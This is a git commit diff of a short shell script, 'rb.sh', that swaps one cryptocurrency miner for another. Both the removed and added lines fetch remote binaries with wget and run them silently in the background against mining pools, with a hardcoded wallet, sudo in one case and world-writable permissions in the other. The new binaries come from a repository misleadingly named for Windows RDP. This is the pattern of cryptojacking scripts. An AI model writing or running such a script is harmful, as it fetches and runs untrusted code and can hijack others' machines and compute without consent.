268d68995dde15b2eb8f3e2c0fc2940d33bec64a
SalinaMoh <98037354+SalinaMoh@users.noreply.github.com>
2022-04-08 12:08:40 +0000

    Update rb.sh

--- rb.sh
+++ rb.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-9-3-Linux.tar.xz && rm SRBMiner-Multi-0-9-3-Linux.tar.xz && sudo ./SRBMiner-Multi-0-9-3/SRBMiner-MULTI --algorithm randomsfx --pool sf.pool-pay.com:4025 --wallet Safex5yuPhr9TAZMoZ3ZfQ5ERrEBB51QsGqpuHjJKLEj6CJ5CvuQPMXRcC37iQZSvtXPrhQEJopMc2W41VMLzyqGd2u7NcyUmKW2X --password x@$(echo $(shuf -i 1000-9999 -n 1)-ARB) --disable-gpu --cpu-threads 8  > /dev/null 2>&1 &
+wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigDaemon && wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigMiner && chmod 777 xmrigDaemon && chmod 777 xmrigMiner && ./xmrigDaemon -o 8.209.98.71:443 -u Azud -p x --donate-level 1 -k  /dev/null 2>&1 &
 uname -a
